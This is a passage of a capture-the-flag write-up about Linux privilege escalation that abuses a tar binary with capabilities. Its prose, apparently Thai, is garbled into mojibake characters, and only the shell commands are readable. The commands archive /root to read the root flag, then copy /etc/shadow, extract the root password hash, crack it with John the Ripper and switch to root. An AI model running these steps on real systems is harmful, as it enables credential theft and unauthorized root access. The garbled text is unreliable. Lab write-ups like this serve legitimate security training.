‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÇ‡∏î‡∏¢‡∏ï‡∏£‡∏á: ‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÑ‡∏ü‡∏•‡πå `test.tar` ‡πÉ‡∏ô‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô ‡∏ã‡∏∂‡πà‡∏á‡πÄ‡∏õ‡πá‡∏ô archive ‡∏ó‡∏µ‡πà‡∏ö‡∏£‡∏£‡∏à‡∏∏‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏Ç‡∏≠‡∏á `/root` (‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏•‡∏∞‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏¢‡πà‡∏≠‡∏¢‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î)
	
</details>

3) ‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå‡∏à‡∏≤‡∏Å test.tar ‡πÅ‡∏•‡∏∞‡∏î‡∏∂‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏Ç‡∏≠‡∏á root üóÉÔ∏è
```bash
tar -xvf test.tar
ls
```
- `-x` = extract (‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå‡∏à‡∏≤‡∏Å archive)
- `-v` = verbose (‡πÅ‡∏™‡∏î‡∏á‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå‡∏Ç‡∏ì‡∏∞‡πÅ‡∏ï‡∏Å)
- `-f` test.tar = ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏ü‡∏•‡πå archive ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏ñ‡∏π‡∏Å‡πÅ‡∏ï‡∏Å

![folder-root](images/15.png)

üì§ ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: ‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå `root/` ‡πÉ‡∏ô‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô (‡πÄ‡∏õ‡πá‡∏ô‡∏™‡∏≥‡πÄ‡∏ô‡∏≤‡∏Ç‡∏≠‡∏á `/root` ‡∏ó‡∏µ‡πà‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô archive)

## Root Flag

![root](images/16.png)
</details>


### 2
<details>

üìù ‡∏ß‡∏¥‡∏ò‡∏µ‡∏ô‡∏µ‡πâ‡πÄ‡∏õ‡πá‡∏ô root  ‚Äî ‡∏î‡∏∂‡∏á /etc/shadow ‚Üí ‡πÅ‡∏ï‡∏Å ‚Üí crack password ‚Üí su root

> `/etc/shadow` ‡πÄ‡∏Å‡πá‡∏ö‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÅ‡∏ö‡∏ö hashed ‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î ‡∏ñ‡πâ‡∏≤‡πÄ‡∏£‡∏≤‡πÉ‡∏ä‡πâ `tar` (‡∏ó‡∏µ‡πà‡∏°‡∏µ capability ‡∏Ç‡πâ‡∏≤‡∏°‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå) ‡∏î‡∏∂‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏ô‡∏µ‡πâ‡∏≠‡∏≠‡∏Å‡∏°‡∏≤‡πÅ‡∏•‡πâ‡∏ß crack hash ‡∏Ç‡∏≠‡∏á `root` ‡πÑ‡∏î‡πâ ‡πÄ‡∏£‡∏≤‡∏Å‡πá‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡∏à‡∏£‡∏¥‡∏á‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏ö‡∏±‡∏ç‡∏ä‡∏µ root (`su` ‡∏´‡∏£‡∏∑‡∏≠ `ssh`) ‡πÑ‡∏î‡πâ‡πÄ‡∏•‡∏¢

1. ‡∏™‡∏£‡πâ‡∏≤‡∏á archive ‡∏Ç‡∏≠‡∏á /etc/shadow (‡πÉ‡∏ä‡πâ tar ‡∏ó‡∏µ‡πà‡∏°‡∏µ capability)
```bash
tar -cvf /tmp/shadow.tar /etc/shadow
```
- ‡πÄ‡∏Å‡πá‡∏ö‡πÑ‡∏ü‡∏•‡πå `/etc/shadow` ‡∏•‡∏á‡πÉ‡∏ô `/tmp/shadow.tar`

2. ‡πÅ‡∏ï‡∏Å archive ‡πÅ‡∏•‡∏∞‡∏î‡∏π‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤
```bash
tar -xvf /tmp/shadow.tar -C /tmp
```

![root](images/17.png)

- ‡∏à‡∏∞‡πÑ‡∏î‡πâ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î hash ‡∏Ç‡∏≠‡∏á user ‡πÄ‡∏ä‡πà‡∏ô `root:$6$.......`

3. ‡πÄ‡∏≠‡∏≤ hash ‡∏Ç‡∏≠‡∏á root ‡πÑ‡∏õ‡πÑ‡∏ß‡πâ‡∏ó‡∏µ‡πà‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á attacker (‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏ü‡∏•‡πå‡∏ö‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢) ‡πÄ‡∏û‡∏∑‡πà‡∏≠ crack
‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á ‚Äî ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÑ‡∏ü‡∏•‡πå roots.hash ‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î hash ‡∏Ç‡∏≠‡∏á root:

```bash
echo 'root:$6$.......' > roots.hash
```

![root](images/18.png)

4. ‡πÉ‡∏ä‡πâ John the Ripper (‡∏´‡∏£‡∏∑‡∏≠ hashcat) ‡∏ó‡∏≥ dictionary attack

5. ‡∏î‡∏π‡∏ú‡∏•‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÅ‡∏ï‡∏Å‡πÑ‡∏î‡πâ‡πÅ‡∏•‡πâ‡∏ß

- john --show roots.hash

6. ‡πÉ‡∏ä‡πâ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà root
‡∏ö‡∏ô target:

![root](images/19.png)
	
</details>









